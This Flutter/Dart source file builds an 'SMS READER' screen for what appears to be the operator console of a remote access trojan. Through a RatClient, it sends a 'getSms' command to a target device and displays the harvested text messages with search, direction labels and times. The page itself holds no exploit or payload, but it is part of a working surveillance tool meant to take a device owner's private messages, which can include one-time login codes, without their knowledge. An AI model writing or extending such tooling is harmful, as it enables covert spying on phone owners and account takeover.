import 'package:flutter/material.dart';

import 'rat_client.dart';
import '../theme/app_theme.dart';

class SmsReaderPage extends StatefulWidget {
  final RatClient client;
  final String deviceId;

  const SmsReaderPage({
    super.key,
    required this.client,
    required this.deviceId,
  });

  @override
  State<SmsReaderPage> createState() => _SmsReaderPageState();
}

class _SmsReaderPageState extends State<SmsReaderPage> {
  bool _loading = false;
  String _search = '';
  final TextEditingController _searchCtrl = TextEditingController();
  final ScrollController _scrollCtrl = ScrollController();
  final Set<int> _expanded = {};

  RatClient get client => widget.client;
  String get deviceId => widget.deviceId;

  List<Map<String, dynamic>> get _messages {
    final raw = client.dataFor(deviceId)['sms'];
    if (raw is List) return raw.whereType<Map<String, dynamic>>().toList();
    return const [];
  }

  List<Map<String, dynamic>> get _filtered {
    if (_search.isEmpty) return _messages;
    final q = _search.toLowerCase();
    return _messages.where((m) {
      final addr = (m['address'] ?? '').toString().toLowerCase();
      final body = (m['body'] ?? '').toString().toLowerCase();
      return addr.contains(q) || body.contains(q);
    }).toList();
  }

  @override
  void initState() {
    super.initState();
    client.addListener(_onClientData);
    _requestSms();
  }

  @override
  void dispose() {
    client.removeListener(_onClientData);
    _searchCtrl.dispose();
    _scrollCtrl.dispose();
    super.dispose();
  }

  void _onClientData() {
    if (mounted) setState(() {});
  }

  void _requestSms() {
    setState(() => _loading = true);
    client.clearData(deviceId, 'sms');
    client.sendCommand(deviceId, 'getSms', '').then((_) {
      Future.delayed(const Duration(seconds: 3), () {
        if (mounted) setState(() => _loading = false);
      });
    }).catchError((_) {
      if (mounted) setState(() => _loading = false);
    });
  }

  String _formatTime(dynamic ts) {
    if (ts == null) return '';
    DateTime? dt;
    if (ts is num) {
      dt = DateTime.fromMillisecondsSinceEpoch(ts.toInt());
    } else {
      dt = DateTime.tryParse(ts.toString());
    }
    if (dt == null) return '';
    final now = DateTime.now();
    final diff = now.difference(dt);
    if (diff.inMinutes < 1) return 'just now';
    if (diff.inMinutes < 60) return '${diff.inMinutes}m ago';
    if (diff.inHours < 24) return '${diff.inHours}h ago';
    if (diff.inDays < 7) return '${diff.inDays}d ago';
    return '${dt.day}/${dt.month}/${dt.year}';
  }

  String _truncate(String s, [int max = 120]) {
    if (s.length <= max) return s;
    return '${s.substring(0, max)}...';
  }

  @override
  Widget build(BuildContext context) {
    final filtered = _filtered;

    return Scaffold(
      backgroundColor: AppTheme.bgDeep,
      appBar: AppBar(
        backgroundColor: AppTheme.bgSurface,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: AppTheme.textPrimary, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'SMS READER',
              style: AppTheme.headingS.copyWith(
                color: AppTheme.gold,
                letterSpacing: 2,
              ),
            ),
            const SizedBox(height: 2),
            Text(
              _messages.isEmpty
                  ? 'no messages'
                  : '${_messages.length} message${_messages.length == 1 ? '' : 's'}',
              style: AppTheme.caption,
            ),
          ],
        ),
        actions: [
          if (_loading)
            const Padding(
              padding: EdgeInsets.only(right: 12),
              child: SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: AppTheme.neonGreen,
                ),
              ),
            ),
        ],
      ),
      body: Column(
        children: [
          _buildSearchBar(),
          AppTheme.cyberDivider(color: AppTheme.gold),
          Expanded(
            child: _loading && filtered.isEmpty
                ? _buildLoadingState()
                : filtered.isEmpty
                    ? _buildEmptyState()
                    : _buildSmsList(filtered),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        backgroundColor: AppTheme.bgCard,
        foregroundColor: AppTheme.neonGreen,
        onPressed: _requestSms,
        child: _loading
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: AppTheme.neonGreen,
                ),
              )
            : const Icon(Icons.refresh, size: 22),
      ),
    );
  }

  Widget _buildSearchBar() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 12, 16, 0),
      decoration: AppTheme.inputDecor(),
      child: TextField(
        controller: _searchCtrl,
        style: AppTheme.bodyM.copyWith(color: AppTheme.textPrimary),
        onChanged: (v) => setState(() => _search = v.trim()),
        decoration: InputDecoration(
          hintText: 'Search sender / message...',
          hintStyle: AppTheme.bodyM.copyWith(color: AppTheme.textMuted),
          prefixIcon: const Icon(Icons.search, color: AppTheme.textMuted, size: 18),
          suffixIcon: _search.isNotEmpty
              ? IconButton(
                  icon: const Icon(Icons.close, color: AppTheme.textMuted, size: 16),
                  onPressed: () {
                    _searchCtrl.clear();
                    setState(() => _search = '');
                  },
                )
              : null,
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        ),
      ),
    );
  }

  Widget _buildLoadingState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          const SizedBox(
            width: 32,
            height: 32,
            child: CircularProgressIndicator(
              strokeWidth: 3,
              color: AppTheme.neonGreen,
            ),
          ),
          const SizedBox(height: 16),
          Text(
            'FETCHING SMS...',
            style: AppTheme.headingS.copyWith(
              color: AppTheme.textMuted,
              letterSpacing: 2,
            ),
          ),
          const SizedBox(height: 6),
          Text(
            'Requesting messages from device',
            style: AppTheme.bodyM.copyWith(color: AppTheme.textMuted),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            _search.isNotEmpty ? Icons.search_off : Icons.sms_outlined,
            color: AppTheme.textMuted,
            size: 48,
          ),
          const SizedBox(height: 16),
          Text(
            _search.isNotEmpty ? 'NO MATCHES' : 'NO SMS FOUND',
            style: AppTheme.headingS.copyWith(color: AppTheme.textMuted, letterSpacing: 2),
          ),
          const SizedBox(height: 8),
          Text(
            _search.isNotEmpty
                ? 'No SMS match "${_search}"'
                : 'Tap refresh to fetch SMS from device',
            style: AppTheme.bodyM.copyWith(color: AppTheme.textMuted),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          if (_search.isEmpty)
            ElevatedButton.icon(
              onPressed: _requestSms,
              icon: const Icon(Icons.refresh, size: 16),
              label: const Text('FETCH SMS'),
              style: AppTheme.primaryButton(AppTheme.neonGreen),
            ),
        ],
      ),
    );
  }

  Widget _buildSmsList(List<Map<String, dynamic>> messages) {
    return ListView.builder(
      controller: _scrollCtrl,
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 80),
      itemCount: messages.length,
      itemBuilder: (context, i) => _buildSmsCard(messages[i], i),
    );
  }

  Widget _buildSmsCard(Map<String, dynamic> msg, int index) {
    final address = (msg['address'] ?? 'UNKNOWN').toString();
    final body = (msg['body'] ?? '').toString();
    final time = _formatTime(msg['date']);
    final type = msg['type'];
    final isSent = type == 2 || type?.toString() == '2';
    final isExpanded = _expanded.contains(index);
    final color = isSent ? AppTheme.teal : AppTheme.sky;
    final preview = isExpanded ? body : _truncate(body, 100);

    return GestureDetector(
      onTap: () => setState(() {
        if (isExpanded) {
          _expanded.remove(index);
        } else {
          _expanded.add(index);
        }
      }),
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.all(12),
        decoration: AppTheme.cardDecor(accent: color),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 28,
                  height: 28,
                  decoration: BoxDecoration(
                    color: color.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(AppTheme.radiusS),
                    border: Border.all(color: color.withValues(alpha: 0.4), width: 1),
                  ),
                  child: Icon(
                    isSent ? Icons.arrow_upward : Icons.arrow_downward,
                    size: 13,
                    color: color,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        address,
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                        style: AppTheme.bodyL.copyWith(
                          color: AppTheme.textPrimary,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                      const SizedBox(height: 1),
                      Text(
                        isSent ? 'SENT' : 'RECEIVED',
                        style: AppTheme.label.copyWith(
                          color: color,
                          fontSize: 8,
                          letterSpacing: 2,
                        ),
                      ),
                    ],
                  ),
                ),
                if (time.isNotEmpty)
                  Text(
                    time,
                    style: AppTheme.caption.copyWith(color: AppTheme.textMuted),
                  ),
              ],
            ),
            const SizedBox(height: 10),
            AppTheme.cyberDivider(color: color.withValues(alpha: 0.15)),
            const SizedBox(height: 10),
            Text(
              preview.isEmpty ? '(empty message)' : preview,
              style: AppTheme.bodyM.copyWith(
                color: preview.isEmpty ? AppTheme.textMuted : AppTheme.textSecondary,
                fontStyle: preview.isEmpty ? FontStyle.italic : FontStyle.normal,
                height: 1.5,
              ),
            ),
            if (body.length > 100) ...[
              const SizedBox(height: 6),
              Row(
                children: [
                  Text(
                    isExpanded ? 'SHOW LESS' : 'SHOW MORE',
                    style: AppTheme.label.copyWith(
                      color: color,
                      fontSize: 9,
                      letterSpacing: 1.5,
                    ),
                  ),
                  const SizedBox(width: 4),
                  AnimatedRotation(
                    turns: isExpanded ? 0.5 : 0,
                    duration: const Duration(milliseconds: 200),
                    child: Icon(Icons.expand_more, size: 14, color: color),
                  ),
                ],
              ),
            ],
          ],
        ),
      ),
    );
  }
}
